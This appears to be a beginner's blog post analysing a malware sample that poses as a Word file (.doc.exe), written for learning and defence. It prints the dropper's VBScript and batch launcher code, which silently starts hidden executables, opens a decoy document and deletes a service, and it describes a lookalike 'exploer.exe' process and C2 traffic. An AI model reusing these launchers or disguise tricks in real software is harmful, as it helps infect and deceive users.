    Analysing Malware: A beginners approach :)

    Few days back, I got an assignment to analyze a malware and its behavior over the system. Being a beginner, it was a bit complicated task for me as I haven't worked on analyzing a malware before. But I took the challenge, as always inspired by vinnu bhai to take them and complete them

    Today here, I will present you a beginners approach to analyze malware. Ok, I got the sample to analyze. Warning: To avoid getting infected, always use a Virtual Machine to analyse a malware.

    I got the sample and started the analysis on my server 2003 R2 on VMware. On the first look, it looks as a word file to the victim. On close analysis, its a file of MS Word with the extension .doc.exe .To test the file, I opened it on my Virtual machine on

    --> After the exectuion, the malware copies it self to a location in the C drive

    --> The location is C:\WINDOWS\System32\Restore1

    --> The folder has the following files:


    [+] test.vbs

    Code of the file:

    /*

    Dim WSHShell
    Set WSHShell = WScript.CreateObject("WSCript.shell")
    WSHShell.Run "C:\WINDOWS\system32\Restore1\start1.bat",0, False
    WSHShell.Run "ims.exe", 0, false
    WSHShell.Run "exploer.exe", 0, false
    WSHShell.Run "Http_t.exe", 0, false
    Set WSHShell = Nothing
    WScript.Quit(0)

    */

    This file shall allow the execution of other files of the malware as analysed from the code.


    [+] Start1.bat

    Code of the file:

    /*
    @ echo off
    @ start "explorer.exe" "important.doc"
    @ C:\WINDOWS\system32\Restore1\ims.exe
    @ C:\WINDOWS\system32\Restore1\exploer.exe
    @ C:\WINDOWS\system32\Restore1\Http_t.exe
    @ sc.exe delete sound2k
    @ exit
    */

    This file shall allow the execution of infected exploer.exe, Http_t.exe, ims.exe, important.doc files present in the folder. For the purpose of getting them into startup.

    [+] exploer.exe : An infected explorer.exe file. Just to confuse you in case you wanna end the process using taskbar

    [+] Http_t.exe : Seems to be an infected file that will comunicate with the malware network

    --> On execution, we checked the network packets and flow of network using "Wireshark"

    --> The communication was happening between Localhost-->[IP- Removed for security reasons]
